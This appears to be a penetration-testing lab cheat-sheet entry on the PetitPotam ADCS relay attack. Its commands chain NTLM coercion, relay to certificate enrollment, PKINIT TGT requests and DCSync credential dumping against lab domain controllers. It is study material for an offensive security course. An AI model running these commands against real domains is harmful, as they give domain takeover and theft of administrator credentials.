# 01.20 PetitPotam ADCS Relay

> Coerce DC auth via `PetitPotam.py` LSARPC, relay to ADCS HTTP enrollment for a DC cert, then DCSync via `gettgtpkinit.py`.

## Overview

Coerce DC authentication via PetitPotam LSARPC, relay to ADCS HTTP enrollment to obtain a DC certificate, then use gettgtpkinit.py for TGT and perform DCSync. Alternatively use the base64 certificate with Rubeus asktgt /ptt from Windows for pass-the-ticket.

## Steps

- Start ntlmrelayx.py targeting the CA certsrv endpoint with --adcs.
- Run PetitPotam.py to coerce DC authentication to attacker host.
- Capture base64 certificate from ntlmrelayx output.
- gettgtpkinit.py to get TGT; set KRB5CCNAME env var.
- secretsdump.py -k -no-pass to DCSync using TGT.
- Or: Rubeus asktgt /certificate: /ptt from Windows, then mimikatz lsadump::dcsync.

## Commands

### Start ntlmrelayx

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.<DOMAIN>.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

### Trigger coercion

```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

### Request TGT from cert

```bash
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

### Set KRB5CCNAME

```bash
export KRB5CCNAME=dc01.ccache
```

### DCSync with TGT

```bash
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.<DOMAIN>.LOCAL
```

### Rubeus PTT from cert

```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```
